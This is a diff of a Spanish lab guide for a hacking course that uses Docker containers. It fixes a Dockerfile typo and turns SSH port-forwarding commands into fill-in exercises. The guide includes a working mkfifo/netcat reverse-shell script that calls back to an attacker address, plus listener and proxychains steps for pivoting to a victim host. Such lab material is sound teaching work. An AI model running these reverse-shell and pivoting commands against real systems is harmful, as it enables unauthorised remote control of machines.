@@ -162,7 +162,7 @@ Para este contenedor se ha habilitado el login de root mediante SSH, algo poco r
 La sentencia `extra_hosts`añade una entrada en el archivo `/etc/hosts` del contenedor para que de esta forma podamos utilizar su nombre, en lugar de la IP, para comunicarnos:
 
 ```Dockerfile
-ROM phusion/baseimage:jammy-1.0.1
+FROM phusion/baseimage:jammy-1.0.1
 
 RUN apt update -y \
     && apt install -y \
@@ -368,7 +368,7 @@ Para vulnerar la máquina **victim2**, vamos a hacer uso de dos elementos:
   
     ```bash title="rev.sh"
     #!/bin/bash
-    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 172.16.101.11 8500 >/tmp/f    
+    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 172.16.101.11 9000 >/tmp/f    
     ```
 
 2. Este código como POC (*proof of concept* o prueba de concepto)
@@ -434,7 +434,7 @@ Aquí necesitamos utilizar el concepto de de **remote port forwarding**. Con est
     Consulta [este](https://cyberblog.es/index.php/2023/03/19/ssh-tunneling-local-remote-port-forwarding/) link o cualquier otro que te sea necesario para entender el concepto de remote port forwarding y ser capaz de completar el siguiente comando, que deberá ser ejecutado en **attacker**:
     
       ```bash
-      ssh ___ :___:172.16.100.10:___ root@helper -N -f
+      ssh ___ :___:172.16.100.10:___ root@helper __ __
       ```
 
 !!!task "Tarea"
@@ -445,9 +445,9 @@ Ahora sólo estamos a un pequeñísimo paso de conseguir nuestra shell inversa. 
 !!!task "Tarea"
     Documenta los pasos a seguir con la nueva redirección de puertos y el éxito comprometiendo esta nueva máquina. Elabora un diagrama en [https://app.diagrams.net/](https://app.diagrams.net/) donde se vea el proceso:
 
-      1. `ssh __ :__:172.16.100.10:__ -R :__:172.16.100.10:__ root@helper -N -f`
+      1. `ssh __ :__:172.16.100.10:__ __ :__:172.16.100.10:__ root@helper -N -f`
       2. `python3 -m http.server 80`
-      4. `ncat -lvnp 1331`
+      4. `ncat -lvnp 9000`
       3. `proxychains4 -q ./poc.sh 172.16.101.21`
 
 #  Cuestión
